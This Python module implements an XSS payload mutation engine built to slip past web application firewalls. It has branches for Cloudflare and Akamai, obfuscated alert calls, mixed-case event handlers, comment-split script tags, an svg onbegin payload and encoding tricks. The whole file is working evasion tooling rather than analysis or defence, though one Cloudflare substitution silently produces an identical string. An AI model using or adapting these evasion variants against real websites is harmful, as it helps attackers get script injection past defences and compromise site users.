"""Payload mutation engine for WAF-aware variant generation."""

from __future__ import annotations

import re
from typing import List, Optional


class PayloadMutator:
    """Generate low-noise payload variants for WAF evasion."""

    def mutate(self, payloads: List[str], waf_name: Optional[str] = None, max_variants_per_payload: int = 2) -> List[str]:
        if not payloads:
            return []

        waf = (waf_name or "").lower()
        out: List[str] = []

        for payload in payloads:
            variants: List[str] = []

            if "alert(1)" in payload:
                variants.append(payload.replace("alert(1)", "window['ale'+'rt'](1)"))
                variants.append(payload.replace("alert(1)", "self['alert'](1)"))

            if "onerror" in payload:
                variants.append(payload.replace("onerror", "oNerRor"))
            if "onload" in payload:
                variants.append(payload.replace("onload", "oNloAd"))

            if "script" in payload.lower():
                variants.append(re.sub(r"script", "scr<!--x-->ipt", payload, flags=re.IGNORECASE))

            if "cloudflare" in waf:
                if "alert" in payload:
                    variants.append(payload.replace("alert", "\u0061lert"))
                variants.append("<svg><animatetransform onbegin=alert(1) attributeName=transform>")
            elif "akamai" in waf:
                if "alert(1)" in payload:
                    variants.append(payload.replace("alert(1)", "[1].find(alert)"))
                if " " in payload:
                    variants.append(payload.replace(" ", "%09", 1))
            elif waf:
                if "<" in payload:
                    variants.append(payload.replace("<", "%3C", 1))

            seen = set()
            kept: List[str] = []
            for v in variants:
                if v and v != payload and v not in seen:
                    seen.add(v)
                    kept.append(v)
                if len(kept) >= max_variants_per_payload:
                    break

            out.extend(kept)

        return out
